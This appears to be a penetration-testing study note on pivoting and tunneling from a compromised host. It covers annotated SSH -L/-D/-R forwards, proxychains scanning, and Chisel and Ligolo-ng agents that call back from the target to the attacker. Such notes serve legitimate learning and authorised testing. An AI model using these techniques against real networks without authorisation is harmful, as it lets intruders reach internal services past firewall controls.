# Pivoting and Tunneling

You have a shell on one host, and enumeration found a service that host can reach but your Kali box cannot — a database bound to `127.0.0.1`, or a second machine on an internal subnet. Pivoting turns the host you own into a relay so your own tools can reach that service directly.

The prerequisite is always the same: **find the internal listener first**. `ss -tlnp` on the target ([[Linux-Local-Enumeration]]) lists what is bound to loopback or an internal interface — those are the ports worth forwarding. Forwarding blind, before you know what is listening where, is how the guesswork starts.

Then pick the forward by **how much** you need to reach: one known port (`-L`), a whole subnet of unknown ports (`-D`), or a way back to yourself from a host that cannot dial out (`-R`). When the box has no SSH on it at all, section 4 swaps the SSH tunnel for a tool you drop on the target.

## 1 — One known port: local forward

```bash
ssh -L 9999:127.0.0.1:5432 christine@TARGET_IP -N
```

- `-L 9999:127.0.0.1:5432` → bind port **9999 on your machine** and tunnel it to `127.0.0.1:5432` **as resolved on the target**. The `127.0.0.1` here is the target's own loopback, not yours — this is the whole point, since that address is exactly what your external scan could not see.
- `-N` → do not run a remote command, just hold the tunnel open. Without it you also get an interactive shell, which is fine until you type `exit` out of habit and drop the tunnel mid-tool. `-N` makes the session's only job the forward.
- `-f` → optional, background the tunnel after auth so it does not occupy the terminal. Easy to forget it is still running; `ps aux | grep ssh` finds it when a port is mysteriously taken.

## 2 — A whole subnet: dynamic forward (SOCKS) + proxychains

```bash
ssh -D 1080 christine@TARGET_IP -N
```

- `-D 1080` → open a SOCKS proxy on **your** port 1080; every connection sent to it is routed out of the target and resolved from the target's position on the network. One tunnel, every port, every reachable host.
- point tools at it through **proxychains**: add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf`, then prefix the tool: `proxychains nmap -sT -Pn 10.10.10.20`.
- `-sT` and `-Pn` are **not optional through a proxy** → SOCKS carries full TCP connections only. A SYN scan (`-sS`) sends raw packets the proxy cannot relay and returns all-filtered garbage; host discovery (`-Pn` disables it) relies on [[Security-Terms#^icmp|ICMP]] the proxy also drops, so without `-Pn` nmap decides every host is down and scans nothing.
- names can leak → by default proxychains resolves a hostname on **your** box before the traffic enters the tunnel, so an internal name only the target can resolve fails even with the tunnel up. Uncomment `proxy_dns` in the config to push resolution through the tunnel too, or sidestep it by using IPs, which never leak.

## 3 — A host that cannot dial out: remote forward

```bash
ssh -R 8000:127.0.0.1:8000 christine@TARGET_IP -N
```

- `-R 8000:127.0.0.1:8000` → bind port 8000 **on the target**, tunnelling it back to `127.0.0.1:8000` **on your Kali**. The internal host now reaches your web server (or listener) by connecting to the pivot's port 8000, never touching your box directly.
- for the pivot to bind that port on all its interfaces so a *third* host can reach it, the SSH server needs `GatewayPorts yes`; with the default `no`, `-R` binds only the pivot's loopback, which is enough when the pivot itself is the client.
- direction is the trap → `-L` pulls a remote port to you, `-R` pushes a local port out to the remote. Swapping them produces a tunnel that binds cleanly and carries nothing.

## 4 — When SSH is not on the box

A Windows pivot with no OpenSSH, or any host you cannot get an SSH session on, needs a tool you drop on the target yourself. Both of these have the target call *back* to you, so they cross a firewall that only allows outbound traffic.

### Chisel — reverse SOCKS over HTTP

The same SOCKS proxy as `-D`, but tunnelled over HTTP and built from the target end.

```bash
chisel server -p 8080 --reverse --socks5
```

- run on **your** box. `--reverse` → allow clients to open a listener back on your side; drop it and the `R:` below is refused. `--socks5` → serve a SOCKS5 proxy. `-p 8080` → the port the target dials home to.

```bash
chisel.exe client YOUR_IP:8080 R:1080:socks
```

- run on **the target**. `R:1080:socks` → open a SOCKS proxy on your `127.0.0.1:1080` whose traffic exits from the target. `R` = remote, i.e. the listener lands on the server end (you), not on the client.
- `YOUR_IP` is your tunnel-interface address (`tun0` on a VPN), not a public one — the target reaches you back over that link.
- then proxychains exactly as in section 2: `socks5 127.0.0.1 1080`.

### Ligolo-ng — a route instead of a proxy

No SOCKS, no proxychains. It adds a virtual network card (a TUN, network-tunnel, interface — a software-made adapter) to your box; you route the internal subnet through it and every tool reaches that subnet natively — the SYN scan works, ping works, none of the `-sT -Pn` workarounds.

```bash
sudo ip tuntap add user $USER mode tun ligolo
```

- create the interface once, then `sudo ip link set ligolo up` to bring it up. On Ligolo ≥ 0.6 the proxy console does this itself with `interface_create`.

```bash
./proxy -selfcert
```

- your listener (`-selfcert` → use a self-signed certificate). The agent runs on the target and calls back: `./agent -connect YOUR_IP:11601 ...`.

```bash
sudo ip route add 192.168.13.0/24 dev ligolo
```

- send that whole subnet down the interface. `/24` → first three octets fixed, last one free: the 256 addresses of that network.
- in the proxy console, `session` to select the agent, then `start` — miss `start` and the agent shows connected while no traffic moves.
